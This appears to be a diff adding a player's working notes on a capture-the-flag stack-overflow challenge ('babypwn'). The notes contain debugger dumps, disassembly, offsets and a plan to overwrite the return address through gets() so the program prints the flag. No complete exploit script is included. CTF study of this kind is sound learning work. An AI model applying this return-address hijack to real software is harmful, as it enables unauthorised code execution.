@@ -1,0 +1,172 @@
+check_user_hash:
+- sub rsp, 0x78
+- lea rbp, [rsp + 0x10]
+
+# We are 120 bytes away from where we were (doesn't matter)
+0x78 = 120
+
+# This is our stack
+0x10 = 16
+
+MD5_Init(&c) -> MD5_Init($rbp)
+MD5_Final(md5, &c) -> MD5_Final($rsp, $rbp)
+
+flag_md5 == md5 == $rsp == 0x7fffffffce00
+c == $rbp
+
+user_md5 == $rbp == 0x7fffffffce10
+
+Can't overwrite flag_md5, but we can smash the stack underneath
+To fool `hex_to_binary`, can we provide a fake null character?
+- Does `gets` stop as soon as it reaches a null character? No
+- When it reaches newline or EOF, it replaces it with a '\0'
+
+Return address from check_user_hash:
+0x7fffffffce88 ◂— 'faabgaab'
+
+Distance between user_md5 and return addr
+0x7fffffffce88->0x7fffffffce10 is -0x78 bytes (-0xf words)
+120 bytes
+
+This is the instruction we want to return to:
+0x555555555193 <main+179>                    mov    rdi, r12
+
+However, naively setting the return address to this value will overwrite the
+flag text we need. Instead, we may need to create some shellcode within our
+payload.
+
+Wait a sec. PIE is enabled. That means we can't just use the address.
+However, ASLR is disabled. What does this mean?
+
+Why is the flag still in memory? I thought we wiped it. Apparently not. Its
+address is larger the buffer address.
+
+In that case, let's try jumping again to:
+0x555555555193
+
+But this makes me wonder why the executable stack was enabled.
+
+pwndbg> hexdump 0x7fffffffce6c-12
++0000 0x7fffffffce60  43 53 52 7b  74 68 69 73  2d 69 73 2d  6e 6f 74 2d  │CSR{│this│-is-│not-│
++0010 0x7fffffffce70  74 68 65 2d  72 65 61 6c  2d 66 6c 61  67 7d 0a 00  │the-│real│-fla│g}..│
++0020 0x7fffffffce80  ff ff ff ff  00 00 00 00  10 cf ff ff  ff 7f 00 00  │....│....│....│....│
++0030 0x7fffffffce90  28 26 fd f7  ff 7f 00 00  e8 d9 ff f7  ff 7f 00 00  │(&..│....│....│....│
+
+r12 location: bbaabcaa (location 103)
+
+pwndbg> hexdump 0x7fffffffce6c-32
++0000 0x7fffffffce4c  41 41 41 41  41 41 41 41  41 41 41 41  93 51 55 55  │AAAA│AAAA│AAAA│.QUU│
++0010 0x7fffffffce5c  55 55 00 00  00 53 52 7b  74 68 69 73  2d 69 73 2d  │UU..│.SR{│this│-is-│
++0020 0x7fffffffce6c  6e 6f 74 2d  74 68 65 2d  72 65 61 6c  2d 66 6c 61  │not-│the-│real│-fla│
++0030 0x7fffffffce7c  67 7d 0a 00  ff ff ff ff  00 00 00 00  10 cf ff ff  │g}..│....│....│....│
+#define MD5_DIGEST_LENGTH 16
+
+00:0000│ rsi rbp  0x7fffffffce10 ◂— 0xefcdab8967452301
+
+► 0x55555555547b <check_user_hash+59>    call   gets@plt <gets@plt>
+       rdi: 0x7fffffffce10 ◂— 0x1be3e93037b0d224
+       rsi: 0x0
+       rdx: 0x65eb4ac4
+       rcx: 0xed908384
+
+&user_md5 == 0x7fffffffce10 == $rbp
+
+Using cyclic 64
+strlen(user_md5) == 64
+
+[29132.044389] traps: babypwn[223348] general protection fault ip:7fffffffce69 sp:7fffffffcf38 error:0
+
+ ► 0x555555555496 <check_user_hash+86>     mov    rdx, qword ptr [rsp + 8] # flag_md5[8]
+   0x55555555549b <check_user_hash+91>     mov    rax, qword ptr [rsp] # flag_md5[0]
+   0x55555555549f <check_user_hash+95>     xor    rdx, qword ptr [rsp + 0x18] # rbp + 8 == user_md5[8]
+   0x5555555554a4 <check_user_hash+100>    xor    rax, qword ptr [rsp + 0x10] # rbp == user_md5[0]
+   0x5555555554a9 <check_user_hash+105>    or     rdx, rax
+   0x5555555554ac <check_user_hash+108>    sete   al # Set lower byte of `rax` if zero
+   0x5555555554af <check_user_hash+111>    add    rsp, 0x78
+   0x5555555554b3 <check_user_hash+115>    movzx  eax, al # Zero extend lower byte of rax
+   0x5555555554b6 <check_user_hash+118>    pop    rbp
+   0x5555555554b7 <check_user_hash+119>    pop    r12
+   0x5555555554b9 <check_user_hash+121>    ret
+
+unsigned char* rdx = &flag_md5[8]
+unsigned char* rax = &flag_md5[0]
+
+rdx = rdx ^ &user_md5[8]
+rax = rax ^ &user_md5[0]
+
+bool are_equal = rdx | rax
+return are_equal
+
+Why does the `flag` buffer have 1280 bytes? Seems like a lot
+
+Desired jump address from core:
+
+   0x0000555555555178 <+152>:	jne    0x555555555193 <main+179>
+   0x000055555555517a <+154>:	lea    rdi,[rip+0xeb4]        # 0x555555556035
+   0x0000555555555181 <+161>:	call   0x555555555040 <puts@plt>
+   0x0000555555555186 <+166>:	add    rsp,0x508
+   0x000055555555518d <+173>:	xor    eax,eax
+   0x000055555555518f <+175>:	pop    rbp
+   0x0000555555555190 <+176>:	pop    r12
+   0x0000555555555192 <+178>:	ret
+-> 0x0000555555555193 <+179>:	mov    rdi,r12
+   0x0000555555555196 <+182>:	call   0x555555555040 <puts@plt>
+   0x000055555555519b <+187>:	jmp    0x555555555186 <main+166>
+   0x000055555555519d <+189>:	lea    rcx,[rip+0xf2c]        # 0x5555555560d0 <__PRETTY_FUNCTION__.0>
+   0x00005555555551a4 <+196>:	mov    edx,0x38
+   0x00005555555551a9 <+201>:	lea    rsi,[rip+0xe54]        # 0x555555556004
+   0x00005555555551b0 <+208>:	lea    rdi,[rip+0xeb9]        # 0x555555556070
+   0x00005555555551b7 <+215>:	call   0x555555555050 <__assert_fail@plt>
+
+Let's see if we can prevent `flag` from getting clobbered
+
+► 0x55555555514e <main+110>    call   read@plt <read@plt>
+       fd: 0x3
+       buf: 0x7fffffffce60 —▸ 0x7ffff7fb5288 —▸ 0x7ffff7ffe440 —▸ 0x7ffff7fb5aa0 —▸ 0x7ffff7ffe180 ◂— ...
+       nbytes: 0x500
+
+The flag is at 0x7fffffffce60
+
+Do we care about the old rbp?
+
+► 0x5555555554b6 <check_user_hash+118>    pop    rbp
+  0x5555555554b7 <check_user_hash+119>    pop    r12
+  0x5555555554b9 <check_user_hash+121>    ret    
+   ↓
+  0x555555555176 <main+150>               test   eax, eax
+  0x555555555178 <main+152>               jne    main+179 <main+179>
+
+  0x55555555517a <main+154>               lea    rdi, [rip + 0xeb4]
+──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp  0x7fffffffce48 ◂— 0x3
+01:0008│      0x7fffffffce50 —▸ 0x7fffffffce60 ◂— 'CSR{this-is-not-the-real-flag}\n'
+02:0010│      0x7fffffffce58 —▸ 0x555555555176 (main+150) ◂— test   eax, eax
+03:0018│ r12  0x7fffffffce60 ◂— 'CSR{this-is-not-the-real-flag}\n'
+04:0020│      0x7fffffffce68 ◂— '-is-not-the-real-flag}\n'
+05:0028│      0x7fffffffce70 ◂— 'the-real-flag}\n'
+06:0030│      0x7fffffffce78 ◂— 0xa7d67616c662d /* '-flag}\n' */
+07:0038│      0x7fffffffce80 ◂— 0xffffffff
+
+pwndbg> distance 0x7fffffffcde0 0x7fffffffce60
+0x7fffffffcde0->0x7fffffffce60 is 0x80 bytes (0x10 words)
+
+That's 128 bytes. That means it's address is right after the return address.
+
+Note that `gets` will place a `\0` after the return address. So the `C` will be
+overwritten. That's ok, just start a little after it.
+
+Attempt:
+- Do not overwrite flag location
+- Make sure rbp receives `0x3`
+- Make sure r12 receives the address of `flag` (+1 bytes)
+- Return to `puts` in main
+
+Note: flag.txt is in the ROOT directory.
+
+This jump to main attempt works locally on babypwn. However, it does not work
+on it when running in docker.
+
+What's this?
+
+[ 2852.129299] babypwn[25592]: segfault at 1 ip 00007ffff7bf5675 sp 00007fffffffe768 error 4 in libc-2.31.so[7ffff7a8f000+178000]
+[ 2852.129320] Code: 00 00 0f 1f 00 31 c0 c5 f8 77 c3 66 2e 0f 1f 84 00 00 00 00 00 f3 0f 1e fa 89 f9 48 89 fa c5 f9 ef c0 83 e1 3f 83 f9 20 77 2b <c5> fd 74 0f c5 fd d7 c1 85 c0 0f 85 eb 00 00 00 48 83 c7 20 83 e1
